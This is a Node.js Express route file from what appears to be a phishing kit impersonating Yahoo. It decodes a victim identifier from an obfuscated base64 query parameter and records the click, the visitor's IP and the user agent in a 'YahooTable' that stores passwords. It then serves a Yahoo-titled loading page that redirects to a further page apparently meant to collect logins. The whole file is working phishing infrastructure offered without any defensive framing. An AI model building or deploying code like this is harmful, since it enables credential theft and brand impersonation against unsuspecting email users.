
const express = require ('express');
const router = express.Router();
const db = require('../db');
router.use(express.static('public'));

//const fetch = require('node-fetch');



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {
    const data = req.query.bvnvreyeryeyr64fkasfsbtyrhyrhrkfbfh;
   
    if (data == null) {
        res.render('error');
        
          }else{
  
    const userid = Buffer.from(data, 'base64').toString('utf-8');
        
    const word = 'clicked';
    // const clientIP = req.headers['x-forwarded-for'];
    // const ip =  clientIP.split(',')[0].trim();
    const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const pagetype = 0;
    const mobiletype = 0;
    const notify = 2;

const sqlQuery =  'SELECT username FROM YahooTable WHERE username= ?';   
  db.query(sqlQuery, [userid], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

  if (rowCount > 0) {

                const updateQuery = 'UPDATE YahooTable SET password = ?, pagetype = ?, mobiletype = ?, notify = ? WHERE username = ?';
                db.query(updateQuery, [word, pagetype, mobiletype, notify, userid], (err) => {
                    if (err) {
                        console.error('Error inserting record:', err);
                        return res.status(500).send('Internal Server Error');
                    }
                

                    });


        }else{

            const insertQuery = 'INSERT INTO YahooTable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
            db.query(insertQuery, [userid, word, ip, useragent, date, notify], (err) => {
                if (err) {
                    console.error('Error inserting record:', err);
                    return res.status(500).send('Internal Server Error');
                }
              

                });


        }

   
    const url = `/home/?kjgfhdgudgherueru9843efjdfhfwheur=${data}`;

   

    const htmlContent = `
        <!DOCTYPE html>
<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths template user_font_size_normal" lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="Pragma" content="no-cache">
    <title>Yahoo</title>
    <link href="./stylesheet/common,login,zhtml,skin.css" rel="stylesheet" type="text/css">
       <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 1000);
            </script> 
    
    <link rel="SHORTCUT ICON" href="./images/img.ico" id="DWT2" type="image/x-icon">
<style>
.loader {
    width: 30px;
    height: 30px;
    border: 2px solid #f2f2f2;
    border-bottom-color: grey;
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;
    }

    @keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
    } 
    
    #loader {
    
    height:100px;
    width:200px;
    margin-top:280px;
    background-color:#f2f2f2;
    padding-top:35px;
    
    
    }

</style>
</head>
<body class="user_font_system" style="margin: 0px; overflow: hidden;">
	   <center>

	<div id="loader">

	<span class="loader"></span><br><br>

	<span id="load" style="font-family: Helvetica Neue,Helvetica,Arial,Liberation Sans,sans-serif; color:#8b8b8b; display: none;">Loading...</span>
	<script>
	setTimeout(function() {
	  document.getElementById("load").style.display = "block";
	}, 1000);
	</script>
	</div>
	</center>
	</body>
	</html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            
});
}
});

module.exports =router
